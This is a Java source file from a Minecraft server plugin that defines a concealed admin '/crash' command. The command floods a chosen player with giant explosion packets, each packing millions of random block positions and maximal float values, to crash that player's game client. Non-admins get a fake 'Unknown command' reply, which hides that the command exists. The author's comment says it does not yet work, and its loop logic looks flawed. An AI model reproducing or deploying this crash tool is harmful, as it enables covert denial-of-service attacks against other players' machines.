package me.zach.DesertMC.GameMechanics.shhhhh;

import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.wrappers.BlockPosition;
import me.zach.DesertMC.Utils.packet.wrappers.WrapperPlayServerExplosion;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

public class CrashCommand implements CommandExecutor { //TODO this doesn't work, and is very important :(
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args){
        if(sender.hasPermission("admin")){
            if(args.length == 1){
                Player target = Bukkit.getPlayer(args[0]);
                if(target == null) return false;
                ProtocolManager library = ProtocolLibrary.getProtocolManager();
                PacketContainer packet = getBigPacket(target).getHandle();
                for(int i = 0; target.isOnline() || i<250000; i++){
                    try{
                        library.sendServerPacket(target,packet);
                        if(i > 0 && i % 1000 == 0) packet = getBigPacket(target).getHandle();
                    }catch(InvocationTargetException e){
                        e.printStackTrace();
                        break;
                    }
                }
                if(!target.isOnline()){
                    sender.sendMessage(ChatColor.GREEN + "Go for operation 250 Bravo. Target crashed successfully.");
                }
            }else return false;
        }else{
            sender.sendMessage(ChatColor.WHITE + "Unknown command. Type \"/help\" for help.");
            return true;
        }
        return true;
    }

    private WrapperPlayServerExplosion getBigPacket(Player target){
        ThreadLocalRandom random = ThreadLocalRandom.current();
        List<BlockPosition> positions = new ArrayList<>();
        for(int i = 0; i<9999999; i++){
            positions.add(new BlockPosition(random.nextInt(Integer.MIN_VALUE, Integer.MAX_VALUE), random.nextInt(Integer.MIN_VALUE, Integer.MAX_VALUE), random.nextInt(Integer.MIN_VALUE, Integer.MAX_VALUE)));
        }
        Location targetLoc = target.getLocation();
        return WrapperPlayServerExplosion.create(positions, targetLoc.getX(), targetLoc.getY(), targetLoc.getZ(), Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE);
    }
}
